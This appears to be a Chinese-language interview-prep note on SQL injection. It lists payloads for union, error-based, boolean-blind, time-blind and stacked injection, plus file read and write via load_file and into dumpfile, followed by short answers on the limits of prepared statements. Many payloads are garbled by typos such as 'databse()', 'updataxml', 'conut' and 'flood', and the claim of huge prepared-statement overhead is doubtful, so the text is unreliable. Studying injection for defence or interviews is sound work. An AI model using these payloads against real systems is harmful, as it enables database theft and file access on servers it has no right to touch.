---
title: sql注入面试篇
data: 2024-10-25
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/Sql注入/Sql注入|Sql注入]]"
---
## 目标
用于熟悉面试回答，关于sql注入的提问。
## 方案
本文简化环境和具体操作的篇幅，注重原理和playload书写。
## A&Q
### sql注入常见类型

```
1 union select 1,2,databse(); 联合注入

1 and updataxml(1,concat(0x7e,database(),0x7e),2)//报错注入的格式错误

1 and. extractvalue(1,concat(0x7e,dddatabase(),0x7e))

1 and exp(~(database()))

1 and select 1 from (select conut(*),concat(0x7e,database()),flood(rand(0)*2)x from x group by x)a)//主键重复报错注入

1 and select 1 from (select name_const((select database()),1),name_const((select databse(),1))x
//列名重复错误

1 and select ascii(substr(databsde(),1,1))>100 //步尔盲注

1 and if(ascii(substr(database(),1,1))>1,sleep(2),1)//时间盲注

1；select database();//堆叠注入

```
### sql注入读写文件
```
1 union select load_file("/flag")

1 union select "flag{}" into dumpfile "/flag"
```

### Sql预编译为什么不适用某些场景
- 性能开销十分巨大
- 灵活度有限，可能会加大研发成本
- 对应表字段无法进行预编译
### 预编译怎么绕过
注入可能的表字段进行一个绕过。